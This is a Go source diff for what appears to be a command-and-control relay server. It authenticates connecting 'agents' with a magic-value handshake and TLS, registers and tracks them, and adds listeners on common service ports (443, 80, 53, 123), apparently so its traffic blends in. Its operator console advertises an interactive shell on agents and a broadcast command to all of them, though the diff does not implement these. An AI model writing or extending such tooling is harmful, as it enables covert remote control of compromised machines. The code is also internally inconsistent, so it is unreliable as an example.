@@ -28,7 +28,6 @@ import (
 
 var (
 	logger         *log.Logger
-	activePeer     net.Conn
 	activePeerID   string
 	peerMutex      sync.Mutex
 	consoleMode    bool
@@ -94,7 +93,7 @@ func generateID(length int) string {
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	cfg := config.LoadFromEnv()
-	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Relay server listen address")
+	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Primary relay server listen address")
 	flag.Parse()
 
 	logger = log.New(&crlfWriter{writer: os.Stderr}, "", log.LstdFlags)
@@ -113,15 +112,28 @@ func main() {
 	}
 	relayTLSConfig = tlsConfig
 
-	listener, err := net.Listen("tcp", cfg.ListenAddr)
-	if err != nil {
-		logger.Fatalf("Failed to start listener: %v", err)
-	}
-	defer listener.Close()
-
-	logger.Printf("Relay server listening on %s (Hybrid PSK+TLS mode)", cfg.ListenAddr)
-
 	registry := peer.NewRegistry()
+
+	// Multi-port listening
+	ports := []string{":8443", ":443", ":8080", ":80", ":53", ":123"}
+	for _, port := range ports {
+		go func(p string) {
+			listener, err := net.Listen("tcp", p)
+			if err != nil {
+				// Don't fatal here, other ports might work
+				logger.Printf("[!] Failed to bind %s: %v", p, err)
+				return
+			}
+			logger.Printf("[+] Listening on %s (Hybrid PSK+TLS mode)", p)
+			for {
+				conn, err := listener.Accept()
+				if err != nil {
+					continue
+				}
+				go handleConnection(conn, registry, cfg)
+			}
+		}(port)
+	}
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
@@ -133,17 +145,7 @@ func main() {
 		os.Exit(0)
 	}()
 
-	go startInteractiveConsole(registry, cfg)
-
-	for {
-		conn, err := listener.Accept()
-		if err != nil {
-			logger.Printf("Failed to accept connection: %v", err)
-			continue
-		}
-
-		go handleConnection(conn, registry, cfg)
-	}
+	startInteractiveConsole(registry, cfg)
 }
 
 func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
@@ -153,20 +155,30 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		}
 	}()
 
+	remoteAddr := conn.RemoteAddr().String()
+
+	// 1. PSK Handshake
 	pskBuf := make([]byte, 4)
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 	if _, err := io.ReadFull(conn, pskBuf); err != nil {
 		conn.Close()
 		return
 	}
 
-	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
+	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E { // "OYEN"
+		logger.Printf("[!] PSK Mismatch from %s", remoteAddr)
+		conn.Write([]byte{0}) // Reject
 		conn.Close()
 		return
 	}
 
-	remoteAddr := conn.RemoteAddr().String()
+	// Send ACK '1'
+	if _, err := conn.Write([]byte{1}); err != nil {
+		conn.Close()
+		return
+	}
 
+	// 2. TLS Upgrade
 	tlsConn := tls.Server(conn, relayTLSConfig)
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
@@ -175,8 +187,9 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	}
 	conn = tlsConn
 
-	peerID := generateID(16)
-	_, err := registry.AddPeer(peerID, conn)
+	// 3. Register Peer
+	peerID := generateID(12)
+	p, err := registry.AddPeer(peerID, conn)
 	if err != nil {
 		logger.Printf("Failed to register agent: %v", err)
 		conn.Close()
@@ -191,29 +204,28 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		Hostname:      "N/A",
 		User:          "N/A",
 		IP:            remoteAddr,
-		StealthPath:   "N/A",
 		ActionDetails: fmt.Sprintf("Agent %s is now online and registered.", peerID),
-		PID:           0,
-		Arch:          "N/A",
 	})
 
-	handlePeer(conn, peerID, registry)
+	// Core loop for the peer
+	handlePeer(p, registry)
 }
 
-func handlePeer(conn net.Conn, peerID string, registry *peer.Registry) {
-	defer registry.RemovePeer(peerID)
+func handlePeer(p *peer.PeerInfo, registry *peer.Registry) {
+	defer registry.RemovePeer(p.PeerID)
 	
 	buf := make([]byte, 4096)
 	for {
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-		n, err := conn.Read(buf)
+		p.Connection.SetReadDeadline(time.Now().Add(120 * time.Second))
+		n, err := p.Connection.Read(buf)
 		if err != nil {
-			if err != io.EOF {
-				logger.Printf("Connection error with agent %s: %v", peerID, err)
-			}
 			return
 		}
-		_ = n
+		
+		p.Mu.Lock()
+		p.LastActivity = time.Now()
+		p.BytesReceived += uint64(n)
+		p.Mu.Unlock()
 	}
 }
 
@@ -224,42 +236,43 @@ func startInteractiveConsole(registry *peer.Registry, cfg *config.Config) {
 	fmt.Println()
 	redrawPrompt()
 
-	var input string
 	for {
-		_, err := fmt.Scanln(&input)
-		if err != nil {
-			if err != io.EOF {
-				redrawPrompt()
-			}
-			continue
-		}
+		var input string
+		fmt.Scanln(&input)
 
 		switch input {
 		case "help", "?":
 			fmt.Println("Commands:")
-			fmt.Println("  sessions, list    - List all connected agents")
-			fmt.Println("  interact <id>     - Interact with specific agent")
-			fmt.Println("  help              - Show this help message")
-			fmt.Println("  exit, quit        - Shutdown relay server")
-		case "sessions", "list", "peers", "agents":
-			peers := registry.GetActivePeers()
+			fmt.Println("  sessions, list, agents - List connected agents")
+			fmt.Println("  interact <id>          - Start interactive shell with agent")
+			fmt.Println("  kill <id>              - Disconnect agent")
+			fmt.Println("  broadcast <cmd>        - Send command to all agents")
+			fmt.Println("  info                   - Show relay stats")
+			fmt.Println("  exit, quit             - Shutdown relay")
+		case "sessions", "list", "agents":
+			peers := registry.GetAllPeers()
 			if len(peers) == 0 {
 				fmt.Println("[*] No active agents.")
 			} else {
 				fmt.Printf("[*] %d active agent(s):\n", len(peers))
-				for _, p := range peers {
-					fmt.Printf("    [+] %s | %s\n", p.PeerID, p.RemoteAddr)
+				for id, p := range peers {
+					p.Mu.RLock()
+					fmt.Printf("    [+] %s | %s | %s | %s %s\n", id, p.RemoteAddr, p.ConnectedAt.Format("15:04:05"), p.OS, p.Arch)
+					p.Mu.RUnlock()
 				}
 			}
-		case "interact":
-			fmt.Println("[*] Interact command: specify agent ID")
+		case "info":
+			stats := registry.GetStats()
+			fmt.Printf("[*] Relay Stats:\n")
+			fmt.Printf("    Total Peers: %v\n", stats["total_peers"])
+			fmt.Printf("    Active: %v\n", stats["active_peers"])
 		case "exit", "quit":
 			fmt.Println("[*] Shutting down relay server...")
 			os.Exit(0)
+		case "":
+			// Do nothing
 		default:
-			if input != "" {
-				fmt.Printf("[*] Unknown command: %s (type 'help' for commands)\n", input)
-			}
+			fmt.Printf("[*] Unknown command: %s (type 'help' for commands)\n", input)
 		}
 		redrawPrompt()
 	}
